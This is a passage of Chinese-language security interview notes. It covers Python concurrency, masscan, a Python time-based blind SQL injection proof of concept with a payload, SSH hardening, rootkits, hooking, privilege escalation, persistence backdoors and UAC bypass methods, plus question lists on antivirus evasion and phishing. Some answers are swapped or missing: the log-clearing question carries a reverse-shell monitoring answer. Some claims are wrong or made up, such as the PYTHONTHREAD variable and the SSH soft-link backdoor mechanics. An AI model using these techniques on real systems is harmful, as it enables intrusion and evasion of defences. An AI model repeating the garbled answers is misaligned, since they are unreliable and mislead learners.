2.  通过C扩展移除GIL:可以在C语言中编写不受GIL影响的扩展,在计算密集型任务中调用C扩展,以绕过GIL。但需要小心处理好扩展的线程安全问题。
3.  交替的释放GIL锁:Python的线程在执行IO操作时会自动释放GIL锁,这个时间可以让其他线程运行。所以可以将计算密集型任务和IO操作交替执行,充分利用GIL锁释放的时间窗口实现一定程度的并行。
4.  使用第三方模块:像NumPy、SciPy等科学计算模块,以及Cython等都有自己的并行和多线程实现,可以绕过GIL锁带来的限制。
5.  为多核机器启用多线程:在多核机器上,尽管有GIL锁的限制,但可以针对每个CPU核心启用一个Python线程,这样就可以实现并行计算了。可以通过设置环境变量来指定线程数:

`export PYTHONTHREAD=4 # 为4核机器启用4个线程`

6.  PyPy:PyPy是Python的另一种解释器,它的实现中没有GIL锁,所以可以利用多核CPU实现真正的并行计算。但是,PyPy和CPython有一定的兼容性差异,需要测试程序在PyPy下运行的正确性。

所以,通过以上几种方式可以绕开GIL锁的限制,实现Python更高效地利用多核资源,发挥更强的算力。但同时也需要注意并发问题,保证程序的正确性。
### 9. 简述协程，线程，以及进程的区别
**协程:**

- 协程是一种用户态的轻量级线程,由用户程序自己调度。
- 协程可以实现高并发,但不真正实现并行,因为同一时间只有一个协程在运行。
- 协程可以实现高效的异步IO,通过yield保持程序状态并交出控制权。
- Python中的协程可以使用asyncio和gevent实现。

**线程:**

- 线程是OS级别的实体,由OS内核调度。
- 线程可以实现并发,并在多核CPU上实现并行。
- 线程需要频繁地上下文切换,执行效率低。
- Python通过Thread和ThreadPoolExecutor等模块实现线程。
- 由于GIL的限制,Python的多线程不能充分利用多核CPU。

**进程:**

- 进程是一个资源分配的最小单位,由OS内核创建和调度。
- 进程具有自己的内存空间和系统资源。
- 进程可以实现真正的并行,不受GIL的限制。
- 进程间通信和调度的成本高,通信机制复杂。
- Python通过multiprocessing模块实现进程。

**总结:**

- 协程实现并发,但不并行,用于IO密集型任务,效率最高。
- 线程实现并发,可以并行,用于计算密集型任务,效率中等。
- 进程实现真正的并行,用于CPU密集型计算,调度成本最大,效率相对最低。
### 10. masscan号称世界上最快的扫描器，快的原因是什么，如何实现一个自己的masscan?

1.  它使用了自己实现的TCP/IP栈,而不是调用系统的sockets API。这个TCP/IP栈是专门为扫描目的优化过的,使其效率最大化。
2.  它实现了自己的队列和缓存机制,可以高效地管理待扫描的目标和结果。
3.  它直接构造数据包,通过raw socket发送,而不是调用系统API。这减少了许多中间开销,达到非常高的扫描速度。
4.  它采用了TCB(传输控制块)共享技术,可以避免为每个目标创建新的socket,大大提高了资源利用率。
5.  它将结果集中存放,一次性返回给用户,而不是立即返回每个结果,减少了大量的上下文切换开销。

**所以,要实现一个类似的masscan,可以考虑以下实现方式:**

1.  实现一个轻量级的TCP/IP栈,专注于扫描目的,提供sendip()和recvip()方法直接构造和解析IP数据包。
2.  实现高效的队列和缓存机制,存放待扫描目标和结果。采用多进程或协程提高并发能力。
3.  使用raw socket和TCB共享技术,每个socket可以扫描多个目标,不必为每个目标创建新的socket。
4.  结果集中存储,一次返回给用户,减少上下文切换。
5.  采用C/C++语言开发,避免Python语言的GIL限制,实现真正的多线程/进程。也可以使用更低层的组件如libevent来实现事件驱动。
6.  利用CPU指令集的特性,如SSE指令进行批量数据包构造与解析,提高效率。
7.  充分利用系统资源,如绑核技术将指定CPU核心与特定进程/线程绑定,提高CACHE命中率。
8.  优化代码, tight loop, 减少内存分配等手段进一步提高性能。


### 11. SQL注入中时间盲注的POC应该如何编写? 

时间盲注的POC通常按以下步骤编写:

1.  发起正常的查询请求,记录响应时间T1。
2.  构造注入查询语句,其中条件子句包含可以引起时间延迟的函数,如sleep()。
3.  发起注入查询请求,记录响应时间T2。
4.  比较T1和T2,如果T2显著大于T1,说明注入成功,sleep()函数被执行,否则注入失败。
5.  根据时间差异,判断sleep()的执行时间,推断出数据库的响应,从而获取数据。

举个例子,比如要从USERS表中获取ID为5的用户密码,可以这样编写POC:
```python
import time

# 发起正常查询   
start = time.time()
r = requests.get("http://example.com/profile?id=5")
end = time.time()
T1 = end - start

# 构造时间盲注入查询
payload = "id=5 AND (SELECT password FROM users WHERE id=5) LIKE 'a%' AND sleep(5)"
start = time.time()  
r = requests.get("http://example.com/profile?" + payload)
end = time.time()
T2 = end - start

# 比较时间,推断响应 
if T2 - T1 > 4: 
    print("Password starts with a") 
else:
    print("Password not start with a")
```
编写时间盲注POC的关键是:

1.  精确测量正常请求和注入请求的响应时间。
2.  构造可以引起时间延迟的SQL语句,如使用sleep()函数。
3.  根据时间差异判断sleep()执行与否,推断SQL响应结果。
4.  采用二分法不断缩小范围,逐渐获取更精确的信息。

时间盲注虽然查询效率较低,但可以有效规避WAF和IPS/IDS的检测.



### 12. 如何防护运营商的DNS劫持/链路劫持

1.  使用第三方DNS服务:使用Google DNS(8.8.8.8)、Cloudflare(1.1.1.1)等公共DNS服务,而不是运营商的DNS服务器。这可以防止运营商劫持DNS查询结果。
2.  使用DNSSEC:DNSSEC可以对DNS响应进行数字签名,验证响应的真实性和完整性。对域名启用DNSSEC可以防止运营商劫持DNS记录。
3.  使用DoT或DoH:DoT(DNS over TLS)和DoH(DNS over HTTPS)通过TLS通道传输DNS查询和响应,进行加密传输,防止运营商查看或修改DNS流量。
4.  使用VPN:使用VPN服务进行网络访问,可以加密全部流量,规避运营商的流量劫持或中间人攻击。
5.  检查证书透明度:启用HTTPS的网站,其证书通常会在多个CA的证书透明度日志中登记。定期检查关键域名所使用证书在 Logs 中的记录,可以发现运营商劫持HTTPS流量使用的自签名证书。
6.  监控回源IP:运营商劫持HTTPS流量会改变 dataType=HTTP 的回源IP地址。定期抓取关键域名的流量,分析回源IP地址的变化,可以检测出HTTPS劫持行为。
7.  检查HTTP Strict Transport Security:HSTS会规定浏览器必须通过HTTPS访问某个域名。如果HTTP流量突然可以访问启用HSTS的域名,极有可能遭到了劫持。
8.  持续漏洞扫描:运营商劫持通常会针对已知的设备或软件漏洞进行利用。定期扫描网络范围内的漏洞,并及时修复,可以减少运营商网络攻击的入口点。

综上,通过设置安全的DNS、加密网络流量、证书校验、流量监控及漏洞防护等手段,企业和个人可以在一定程度上规避来自运营商的流量劫持与DNS劫持,维护网络环境的安全。

### 13. 如何防范羊毛党?

1.  完善 promo code 和优惠券管理:
-  限制promo code和优惠券的使用次数,防止过度使用。
-  禁止多个promo code和优惠券叠加使用,避免超出营销预算。
-  promo code设置合理的有效期,及时失效以控制成本。 
-  优惠券要绑定用户,防止转手和滥用,影响企业利润。
2.  优化定价策略: 
-  根据数据分析用户消费习惯与心理,推出恰当的促销活动。 
-  避免长期打折促销,这会培养“只买打折货”的用户习惯。 
-  采用会员价格和早鸟价格等方式,吸引目标用户优先购买。 
-  定期调整某些商品的价格,避免用户习惯固定的低价购买。
3.  加强风控机制:
-  分析用户消费异常数据,发现薅羊毛行为,如大量使用promo code、频繁退款等。
-  电商系统加入“羊毛党”风控规则,限制或禁止部分用户的购买、退款等操作。
-  增加验证码、短信验证等步骤,提高退款申请难度,减少退款机会。
-  加大对涉嫌薅羊毛用户的监控力度,必要时采取法律手段进行制止。
4.  优化物流与库存管理:
-  合理安排物流路线与配送,避免低价商品在配送环节损失过多利润。
-  利用大数据分析购买习惯,合理储备商品库存,避免因缺货而失去销售机会。
-  采购限购商品与防止屯库商品的策略,避免被薅羊毛行为利用。 
5.  提高客户服务质量:
-  完善的客服系统与流程可以提高客户忠诚度,减少退款与投诉等机会。
-  加强员工业务培训,提高业务处理效率与质量,降低用户投诉与异议的概率。
-  重视社交媒体上的用户评论与反馈,避免产生无法解决的客诉问题。 

所以,电商企业要全面防范薅羊毛行为,必须从营销、运营、技术等多个角度进行管理与优化。通过分析用户数据制定针对性策略,加强风控与监控,优化服务质量,这些措施可以最大限度减少恶意薅羊毛对企业的影响。 

###  14. 一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理

1.  迅速评估该0day漏洞的影响范围与危害级别,并及时上报给高层领导,说明漏洞情况与威胁潜力。
2.  根据漏洞信息,检查自身环境是否受到影响,尤其是关键系统与业务应用。若已被入侵,应立即启动应急响应机制,进行隔离与修复。
3.  即使未被入侵,也应视该漏洞为重大威胁,启动相应安全预案机制,进入应急状态。 
4.  跟踪厂商的漏洞修复补丁与说明,待修复方案发布后,根据环境情况测试修复效果与兼容性。
5.  针对不能立即修复的系统,要综合评估风险,采取隔离、监控或其他安全控制措施,以减缓威胁。 
6.  对修复后的系统与环境进行全面检查,发现已被入侵的痕迹尽快进行清理与修复。
7.  应将事件统计与报告,通过漏洞分析与事后总结,优化漏洞修复与应急流程,提高下一次响应效率。
8.  应加强监控维度与频次,通过在第一时间发现相关攻击行为,降低成功攻击的概率。同时严防再次被不同方式利用该漏洞。
9.  高度重视该事件,检查其他系统与环境是否存在相同或相似漏洞,进行修补以全面提高安全防护水平。 
10.  应将事件信息下发给客户与合作伙伴,协助检测与修复,共同应对该网络安全事件。

所以,面对高危0day漏洞,迅速而全面地评估与应对是甲方安全工程师的重要职责。要在第一时间高度重视,排查环境受影响情况,启动应急预案。与厂商紧密配合,按环境逐步检测与修复漏洞带来的安全隐患。同时也要借此机会总结与优化应急能力,提高下一次快速响应的效率,这也是安全工程师持续提高的方向。总之,应对0day漏洞不能有丝毫的怠慢与疏忽,这可能导致无法挽回的严重后果。
### 15. 相关法律法规、标准
熟悉ISO27001、GB/T 22239等标准
信息安全
信息安全体系制度流程及操作指南的编写




## linux 系统安全
### 简述一下守护进程的概念，如何生成一个守护进程? 
守护进程（daemon）是在操作系统后台运行的一种特殊进程，其主要任务是在系统启动时开始运行，提供一些服务或者监控某些系统资源，通常不会与用户交互。
生成一个守护进程需要以下步骤：

1. 调用fork()函数，创建一个新进程，并使父进程退出，这样子进程就成为了孤儿进程，并且可以脱离终端控制。
2. 调用setsid()函数，使子进程成为新的会话组长和进程组长，同时脱离原来的控制终端，避免后续与控制终端的交互影响到守护进程的正常运行。
3. 关闭标准输入、标准输出和标准错误输出。因为守护进程不与控制终端交互，这些输出流也不需要了。
4. 修改守护进程的当前工作目录，一般设置为根目录。
5. 重定向标准输入、标准输出和标准错误输出到/dev/null，以避免日志信息输出到控制终端或文件系统中，从而避免日志文件被占用或满了。
6. 最后执行守护进程的主要逻辑。

示例代码：
```java
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main()
{
    pid_t pid;

    pid = fork(); // 创建新进程

    if (pid < 0) { // 创建进程失败
        exit(1);
    } else if (pid > 0) { // 父进程退出
        exit(0);
    }

    setsid(); // 子进程成为新的会话组长和进程组长

    // 关闭标准输入、标准输出和标准错误输出
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // 修改守护进程的当前工作目录
    chdir("/");

    // 重定向标准输入、标准输出和标准错误输出到/dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_RDWR);
    open("/dev/null", O_RDWR);

    // 执行守护进程的主要逻辑
    while (1) {
        // do something...
    }

    return 0;
}

```
### Linux 服务器的安全运维操作有哪些？如何保护 SSH？
> 1. 更新系统和软件包：定期更新系统和软件包，及时修复安全漏洞和BUG。
> 2. 禁用不必要的服务：禁用不必要的服务和端口，减少攻击面。
> 3. 配置防火墙：设置防火墙规则，只允许必要的流量通过。
> 4. 管理用户和权限：对用户和权限进行管理和控制，禁止使用弱密码和默认账号密码。
> 5. 安装安全软件：安装安全软件，如入侵检测系统（IDS）、漏洞扫描器、防病毒软件等。
> 6. 监控日志：监控系统日志和安全日志，及时发现异常情况和攻击行为。
> 7. 加密通信：采用SSL/TLS等加密协议，保护数据传输的安全性。
> 
保护 SSH 的措施如下：
> 1. 修改 SSH 默认端口：将 SSH 默认端口 22 改为其他不常用的端口，减少暴力破解的风险。
> 2. 禁止 root 登录：禁止 root 用户通过 SSH 登录系统，避免攻击者使用 root 用户直接登录系统。
> 3. 配置公钥认证：使用公钥认证，避免使用密码登录 SSH，增加安全性。
> 4. 限制 IP 地址：限制 SSH 连接的 IP 地址，只允许来自可信任 IP 地址的连接。
> 5. 使用防火墙：设置防火墙规则，只允许必要的 SSH 流量通过。
> 6. 定期更换 SSH 密钥：定期更换 SSH 密钥，提高安全性。
> 7. 配置登录限制：通过 /etc/ssh/sshd_config 配置文件设置登录失败限制，例如限制登录失败次数、限制登录尝试时间等，防止暴力破解密码。
> 8. 使用多因素认证：使用多因素认证，例如使用密码和 OTP（一次性密码）等，提高身份认证的安全性。

**入侵 Linux 服务器后需要清除哪些日志？**
> 反弹shell通常指的是攻击者通过远程命令执行等手段在受害主机上启动一个反向shell，以便于后续攻击。为了监控反弹shell的情况，可以从主机的层面考虑以下几个方面：
> 1. 防火墙设置：可以通过设置防火墙规则，限制从外部访问主机的端口。一些常见的反弹shell使用的端口，如4444、5555、6666、31337等，可以限制这些端口的访问，从而防止反弹shell被成功建立。
> 2. 安装入侵检测系统（IDS）：IDS是一种监控网络活动的系统，可以监测到网络流量中的异常行为，如可疑的连接、异常的数据流等。IDS可以帮助识别反弹shell的连接，从而及早发现并应对攻击。
> 3. 监控系统日志：可以通过监控系统日志，如/var/log/auth.log，及时发现反弹shell的连接。在日志中可以查看到反弹shell建立连接的时间、来源地址、目标地址等信息，从而快速定位问题并采取措施。
> 4. 安装安全软件：可以安装一些安全软件，如入侵检测系统、主机防护软件等，对主机进行实时监控，及时发现反弹shell的连接。
> 5. 限制用户权限：可以通过限制用户权限，如禁止用户使用root账号登录、限制普通用户的sudo权限等，减少反弹shell的风险。
> 
总之，监控反弹shell的关键在于及时发现异常行为，从而采取及时有效的措施，加强主机的安全防护。

**反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？**
> 


**从主机的层面，反弹shell如何监控 **
> 入侵Linux服务器后，攻击者通常会试图清除一些日志，以掩盖自己的痕迹。以下是攻击者可能会尝试清除的一些日志：
> 1. 登录日志：攻击者可能会尝试清除/var/log/auth.log等登录日志，以隐藏他们的登录记录。
> 2. 系统日志：攻击者可能会尝试清除/var/log/syslog等系统日志，以隐藏他们的活动轨迹和异常行为。
> 3. Shell历史：攻击者可能会清除用户的Shell历史记录，以删除他们在Shell中输入的命令和参数，以及密码和其他敏感信息。
> 4. 命令记录日志：如果启用了命令记录日志功能，攻击者可能会尝试删除/var/log/commands.log等记录了所有命令执行记录的日志文件。
> 5. Web服务器访问日志：如果攻击者通过Web服务器进行攻击，他们可能会尝试清除/var/log/apache2/access.log等Web服务器访问日志。
> 
为了避免攻击者删除这些日志，可以采取以下几个措施：
> 1. 定期备份日志文件，存储在另一个独立的服务器上，避免攻击者通过删除日志来掩盖自己的痕迹。
> 2. 启用审计和检测工具，如入侵检测系统（IDS）、安全信息和事件管理系统（SIEM），可以及时检测到攻击行为，并自动记录安全事件和警报。
> 3. 限制特权用户的访问权限，避免攻击者利用特权用户的权限进行攻击。
> 4. 监控系统日志，可以通过监控系统日志，如/var/log/auth.log、/var/log/syslog等，及时发现异常行为和恶意活动。
> 
总之，在保护服务器安全方面，及时备份和监控日志是非常重要的，可以帮助管理员更好地了解服务器的状态和攻击者的行为。同时，避免特权用户和非必要的服务等方面的设置也是必要的，能够提高服务器的安全性。

### Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测 
> Rootkit 是指一种隐藏在操作系统内核或者其他关键系统组件中的恶意软件，用于控制系统和隐蔽自身的存在。根据其实现方式和攻击目标的不同，可以分为以下几种类型：
> 1. 用户态 Rootkit：这种 Rootkit 是运行在用户空间中的，通过修改进程、文件系统、网络等接口来掩盖自己和恶意行为。针对这种 Rootkit 可以采取杀毒软件、入侵检测系统（IDS）等工具进行检测和清除。
> 2. 内核态 Rootkit：这种 Rootkit 是运行在内核空间中的，通过修改内核代码或者钩子函数来掩盖自己和恶意行为。针对这种 Rootkit 可以采取内核模块加载监控工具、根据进程ID和文件描述符扫描内存等方法进行检测和清除。
> 3. Bootkit：这种 Rootkit 是通过感染引导程序、主引导记录等方式，实现在操作系统启动之前就加载并运行的恶意软件。针对这种 Rootkit 可以采取加密启动、BIOS/UEFI 固件验证、操作系统完整性检查等方法进行检测和清除。
> 4. Hypervisor Rootkit：这种 Rootkit 是利用虚拟化技术，在虚拟机监控器（Hypervisor）层面上运行的恶意软件。针对这种 Rootkit 可以采取基于硬件的虚拟化技术、可信计算等方法进行检测和清除。
> 5. Firmware Rootkit：这种 Rootkit 是通过感染硬件固件（例如硬盘、网卡、主板固件等）来控制系统和隐蔽自身的存在。针对这种 Rootkit 可以采取硬件信任平台模块（TPM）、UEFI 固件验证、固件完整性检查等方法进行检测和清除。
> 
为了防范和检测 Rootkit，可以采取以下措施：
> 1. 定期更新系统和软件，及时修复漏洞和安全问题。
> 2. 启用防病毒软件、入侵检测系统（IDS）等安全工具，实时监控系统。
> 3. 禁用不必要的服务和端口，减少攻击面。
> 4. 对用户和权限进行管理和控制，禁止使用弱密码和默认账号密码。
> 5. 使用网络流量分析工具和主机入侵检测工具，监控系统网络和主机行为。
> 6. 使用内核模块加载监控工具、基于硬件的虚拟化技术等工具，检测和清除 Rootkit。
> 7. 对系统进行完整



### ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?
> SSH软链接后门是一种恶意攻击方式，利用软链接技术在不影响原SSH服务的情况下，向SSH服务添加可恶意利用的文件，从而实现后门攻击。其原理是：
> 1. 攻击者创建一个软链接，指向一个包含恶意代码的文件，命名为“sshd”（注意这里是小写）。
> 2. 攻击者将该软链接文件放置在一个路径下，该路径在SSH服务的搜索路径中排名较高，比如在/usr/local/bin目录下。
> 3. 当管理员使用命令行启动SSH服务时，命令行会首先搜索/usr/local/bin目录，如果存在名称为sshd的文件，就会直接启动该文件作为SSH服务。
> 4. 攻击者在恶意代码中监听管理员的账号和密码，一旦管理员登录了SSH服务，攻击者就可以获取管理员的权限，控制系统，进一步扩大攻击面。
> 
由于SSH软链接后门利用了软链接的特性，攻击者可以轻松地修改文件路径和文件名来规避检测，从而难以被发现和清除。而且该攻击方式不仅仅局限于SSH服务，也可以用于其他服务和程序，只要存在搜索路径和文件名冲突的情况。
> 针对该攻击方式，可以采取以下措施：
> 1. 禁止非必要的软链接功能，避免出现类似情况。
> 2. 定期更新系统和软件，及时修复漏洞和安全问题，避免受到其他形式的攻击。
> 3. 限制系统管理员和用户的权限，不要使用root账号登录系统。
> 4. 使用网络和主机安全监控工具，实时监控系统状态和异常行为。
> 5. 使用安全加固工具，对系统进行加固，增强系统的安全性。
> 
需要注意的是，虽然SSH软链接后门是一种比较常见的攻击方式，但它并不是万能的，攻击者还需要了解系统的一些其他特性和机制，才能够成功构造其他后门攻击方式。因此，保持系统安全意识，定期进行安全加固和漏洞修复，以及使用安全工具和策略，都可以有效地防范各种后门攻击。

### Linux中fork的原理是什么，子进程一定会拷贝父进程的资源状态吗？
> 在Linux中，fork()函数是创建一个新的进程，新的进程成为原进程的一个副本，也称为子进程。fork()函数会复制父进程的地址空间、代码段、数据段、堆和栈等资源，但是子进程是父进程的一个完整副本，它具有自己的进程 ID、文件描述符、环境变量等属性。
> 具体的原理是，当调用fork()函数时，系统会为子进程创建一个新的地址空间，其中包含父进程的所有内容。这个地址空间包括了父进程的代码段、数据段、堆和栈。然后，系统会把子进程的地址空间完全复制一份，包括所有的资源和状态，这样就实现了子进程的创建。此后，父进程和子进程是两个完全独立的进程，它们之间没有任何资源共享的关系。
> 但是，有一些特殊情况下，子进程不会完全复制父进程的资源状态，例如：
> 1. 父进程和子进程之间的共享内存，子进程会继承共享内存的指针和标识符，但是并不会复制实际的内存数据。
> 2. 文件描述符的继承，子进程会继承父进程的文件描述符，但是在子进程中关闭一个文件描述符并不会影响父进程的相应文件描述符。
> 3. 一些与进程有关的属性，例如进程组 ID、进程优先级、进程信号掩码等，在子进程中会被重置为默认值。
> 
综上所述，子进程并不一定会拷贝父进程的所有资源状态，但是大部分资源都会被复制。可以说，fork()函数是实现Linux进程创建的重要基础。

### 实现R3层HOOK的方式有哪些，R0层的HOOK又有哪些? 
> R3层（Ring 3）和R0层（Ring 0）是操作系统内核中的两个不同的特权级别，RING 3是用户态，RING 0是内核态。HOOK技术是一种操作系统内核编程技术，可以在系统API调用时拦截、修改或扩展原始系统API功能。
> R3层HOOK的方式主要包括：
> 1. DLL注入：通过将DLL动态链接库注入到目标进程中来实现HOOK。
> 2. API IAT HOOK：修改程序的导入表（IAT）中指向系统API的指针，从而实现API的拦截和修改。
> 3. Inline Hook：直接修改目标函数的汇编代码，从而实现API的拦截和修改。
> 4. VTable Hook：修改C++虚函数表中的函数指针，从而实现API的拦截和修改。
> 
R0层的HOOK技术更加底层，可以实现对操作系统内核的修改和控制，常见的R0层HOOK技术包括：
> 1. SSDT HOOK：修改系统服务描述表（SSDT）中的函数指针，从而实现系统调用的拦截和修改。
> 2. IDT HOOK：修改中断描述表（IDT）中的函数指针，从而实现对操作系统内核的控制。
> 3. DPC HOOK：修改延迟过程调用（DPC）的函数指针，从而实现对系统中断的拦截和控制。
> 4. Kernel Inline Hook：直接修改内核代码中的指令，从而实现对系统API和内核函数的拦截和修改。


### 僵尸进程和孤儿进程的区别是什么? 
> 僵尸进程和孤儿进程都是与进程状态相关的概念，但它们有不同的含义。
> - 僵尸进程（Zombie Process）是指子进程已经执行完毕，但其父进程尚未调用wait()或waitpid()来获取该子进程的退出状态信息。这时子进程的PCB(Process Control Block)仍然存在于系统中，因此被称为“僵尸进程”。僵尸进程是一种资源浪费，如果系统中存在大量的僵尸进程，会消耗系统的进程ID，降低系统运行效率。
> - 孤儿进程（Orphan Process）是指父进程先于其子进程退出，但子进程仍在运行。由于子进程的父进程已经退出，因此操作系统会将该子进程的父进程设置为1号进程(init进程)，即成为“孤儿进程”。这时，init进程会接管孤儿进程并成为其新的父进程，继续控制该进程的运行。孤儿进程不会成为僵尸进程，因为它的父进程(init进程)会及时处理其退出状态信息。
> 
总的来说，僵尸进程和孤儿进程都是一种进程状态，但它们的发生原因和处理方式是不同的。僵尸进程是由于父进程没有及时调用wait()或waitpid()来获取子进程的退出状态信息，而孤儿进程则是因为父进程先于其子进程退出而导致子进程没有父进程。对于僵尸进程，应该通过调用wait()或waitpid()来获取子进程的退出状态信息并及时回收资源；对于孤儿进程，操作系统会将其父进程设置为init进程，init进程会接管孤儿进程并成为其新的父进程，继续控制该进程的运行

## 提权


```
Windows提权思路
2008的服务权限如何进行提权？
Windows UAC原理是什么？
Windows添加用户如何绕过火绒以及360？
烂土豆提权使用过吗？它的原理？
mysql反弹shell提权
windows启动项提权
如何创建一个用户并且提权
️Linux下的提权
Linux下的提权的姿势有哪些？
️数据库提权
MySQL_UDF 提取
udf提权写入时乱码怎么办
udf需要什么条件
udf提权，mysql版本，高版本怎么做
udf提权dump_file为啥不是out_file
MySQL mof 提权
SQL Server提权方式
怎么用 sqlmap 对 sa 权限的 mssql 2008 进行提权？
sqlserver 非sa用户如何提权
列举出 oracle 注入获取管理员权限提权典型漏洞？
```
️
### windows
> #### 1.systminfo  ,根据系统补丁提权
> 2.第三方服务提权
> 3.数据库提权



### linux
> 1.利用系统内核漏洞进行提权 
> 2.泄漏密码提权
> 3.sudo提权
> 4.SUID提权



## 权限维持
```
● UAC是如何进行鉴权校验的? BypassUAC的常见方法有哪些? (★★)
● SSDT表是什么，如何在系统中找到SSDT表并进行hook? (★)
● Windows是如何进行权限控制的，具体的权限校验模型是什么? (★)
ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?(*)
拿到高权限后如何降权
getshell后如何维持权限
如何拿到管理员密码
有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？
有个基于webshell的，但TCP不出网，不会怎么做
```
### windows
> 1.替换系统文件类(shift后门,放大镜后门)
> 2.修改注册表类
> 自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL
> 3.文件类
> 自启动文件夹、office Word StartUp劫持
> 4.计划任务
> schtasks 、WMI、bitsadmin

### linux
> 1.预加载型动态链接库后门
> 2.strace后门
> 3.SSH 后门
> 4.SUID后门
> 5.inetd服务后门
> 6.协议后门
> 7.vim后门
> 8.PAM后门
> 9.进程注入
> 10.Rootkit
> 11.端口复用

**
**️**

## ️免杀


```
13.webshell免杀和检测思路
3.免杀手段和原理
25.谈谈golang做免杀
1、go语言免杀shellcode如何免杀？免杀原理是什么？
2、windows defender防御机制原理，如何绕过？
3、卡巴斯基进程保护如何绕过进行进程迁移？
powershell免杀怎么制作？
提取内存hash被查杀，如何绕过？
shellcode免杀思路说一下？
如何把shellcode嵌入到正常exe中？
有没有写过绕安全狗的webshell
️社工&钓鱼
社工钓鱼接触过吗，有尝试过吗，讲讲
你觉得比较高级的钓鱼方法
你觉得伪造一个网站难度大吗，或者说说思路
有接触过其他语言吗
有没有做过钓鱼有没有做过免杀类的钓鱼
钓鱼exe遇到杀毒软件怎么办
如何伪造钓鱼邮箱？会面临什么问题？
如何判断一个网站是钓鱼网站
Judas反向代理钓鱼工具
社工的理解
```
### UAC是如何进行鉴权校验的? 
> UAC在进行鉴权校验时，主要是通过判断当前用户的权限等级，来决定是否需要进行提示或弹出管理员密码输入框。在 Windows 操作系统中，有以下几种权限等级：
> - 系统管理员：拥有对计算机的完全访问权限。
> - 域管理员：拥有对域的完全访问权限。
> - 用户管理员：拥有对本地计算机的管理权限，但是不能管理域控制器。
> - 标准用户：只拥有受限的访问权限，不能对系统进行重要更改。
> 
当用户进行敏感操作时，系统会根据当前用户的权限等级和 UAC 的配置，来决定是否需要弹出提示框或管理员密码输入框。具体的判断流程和规则，可以参考 Microsoft 的文档。


### BypassUAC的常见方法有哪些?
> UAC（User Account Control）是Windows操作系统中的一种机制，用于限制低权限用户对高权限资源的访问。Bypass UAC是指绕过UAC的方法，从而以高权限运行进程。常见的Bypass UAC的方法如下：
> 1. 使用已经具有管理员权限的进程，启动被攻击的进程。
> 2. 利用Windows内置的一些工具，比如Sdclt.exe、ComputerDefaults.exe、eventvwr.exe等，通过修改这些工具的配置文件或启动参数，来绕过UAC限制。
> 3. 利用Microsoft的应用兼容性修复工具（Application Compatibility Toolkit，简称ACT），该工具提供了一个Shim技术，可以通过创建一个Shim层来欺骗Windows，使其认为应用程序被认为是受信任的，并以管理员权限运行。
> 4. 利用注册表键值，比如HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command等，来修改程序的启动参数。
> 5. 利用UAC自带的一个安全漏洞（UAC Whitelisting Bypass），这个漏洞可以让一些特定的程序绕过UAC限制，例如：C:\Windows\System32\fodhelper.exe，C:\Windows\System32\compattelrunner.exe等。
> 6. 利用UAC的一个安全漏洞（UAC File/Folder virtualization），该漏洞可以将某些需要管理员权限的文件或文件夹，虚拟到一个低权限用户可以访问的目录下，从而达到以管理员权限运行文件的目的。
> 
需要注意的是，Bypass UAC是一种危险的操作，可以导致系统安全性降低，容易被黑客利用进行攻击，因此在进行渗透测试时，需要谨慎操作，并遵守法律法规。





## 安卓
```
Android四大组件是什么？
Activity的生命周期？
Android进程之间的通信方式？
函数参数传递的过程？
函数返回有几种形式？

我觉得移动安全朋友基本的Android开发四大组件、intent数据传递、数据库、网络编程、等等还是需要掌握。
安全相关问题：
介绍一下四大组件的漏洞挖掘过程？
会简单结合简历上的项目来开展询问
Android加壳的种类，以及脱壳的原理？
so混淆的基本方式？
Android抓包防护？
怎么绕过SSLpining？
怎么针对Socket通信防护？
权限的分类？
Bindler通信原理？
你认为一个APP的渗透测试工作怎么开展？
其中会结合你回答的一些问题去穿插的问一下？例如Xposed和frida的工作原理，Xposed和frida的区别等你认为如何开展一个APP的漏洞挖掘工作，这个过程中会结合一些经典的漏洞，去询问你原理，例如Janus漏洞呀等你认为当前移动安全最新关注的一些方向以及可能遇到的一些困境在哪里？
说一下arm-vmp与dex-vmp的区别？
说一下当前dex-vmp的一些解决思路，以及新的vmp的混淆点，有了解么？
说一些ollvm的分类以及如何解决ollvm的初步思路
现在ollvm中你认为比较困难的点是哪些？
```

app绕过环境检测、绕过代理检测

	app双向验证（no required ssl certificate was sent）
	ssl pingning(告诉你证书没配置好、其实已经配置好了)
绕过方法： hook相关证书的类包，dump客户端证书，保存为p12格式
然后保存到抓包工具


app代理检测原理: 通过系统api获取代理状态
绕过代理检测：hook

SSL Pinning证书锁定抓包时,无法连接网络并且也接收不到任何数据将,APP代码内置仅接受指定域名的证书，而不接受操作系统或者浏览器内置的CA根证书对应的任何证书,这个时候就需要往抓包工具中导入app的证书， 通常在assets文件夹中，.p12 .pem .cer。


通过vpn抓包


### Android加壳的种类，以及脱壳的原理？
> Android加壳（也称为Android应用程序保护）是一种技术，用于将原始的Android应用程序代码修改并封装到新的外壳程序中，以提高应用程序的安全性和反编译难度。以下是一些常见的Android加壳技术：
> 1. APKProtect：这种加壳技术通过在原始APK文件中添加自定义的Dex文件和Java代码来保护应用程序。这种方法可以使应用程序的反编译变得更加困难。
> 2. DexGuard：这是一种高级的加壳技术，可以将原始的Dex文件转换为高度优化的字节码，并使用一些防护措施（如混淆、加密和反调试）来保护应用程序。
> 3. Bangcle：这种加壳技术基于自定义的Dex文件，可以防止静态和动态分析，以及反编译应用程序代码。
> 4. Qihoo 360加固：这是一种用于保护Android应用程序的加固方案，可以使用动态加载和加密技术来保护应用程序。
> 
脱壳是指通过各种技术手段将Android应用程序从其加壳保护中解析出来，以便进行反编译、分析和修改。脱壳的原理是对加壳程序进行逆向工程，以查找和利用程序漏洞和弱点，绕过防护措施，进而获取原始应用程序的代码和数据。常见的脱壳技术包括动态调试、内存Dump、HOOK、反编译等。需要注意的是，脱壳本身是一种违法行为，且可能会侵犯应用程序开发者的知识产权。

